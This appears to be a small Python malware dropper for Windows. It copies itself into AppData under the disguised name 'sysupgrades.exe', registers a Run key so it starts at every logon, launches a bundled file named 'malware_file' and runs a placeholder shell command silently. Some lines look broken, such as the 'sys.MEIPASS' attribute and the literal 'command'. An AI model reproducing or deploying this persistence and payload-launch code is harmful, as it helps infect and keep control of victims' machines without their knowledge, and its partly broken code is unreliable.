import subprocess
import os
import shutil
import sys


def add_to_registry():
	# persistence
	new_file = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable, new_file)
		reg_command = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d {new_file}"
		subprocess.call(reg_command, shell=True)


add_to_registry()


def open_added_file():
	added_file = sys.MEIPASS + "\\malware_file"
	subprocess.Popen(added_file, shell=True)


open_added_file()


my_check = subprocess.check_output("command", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
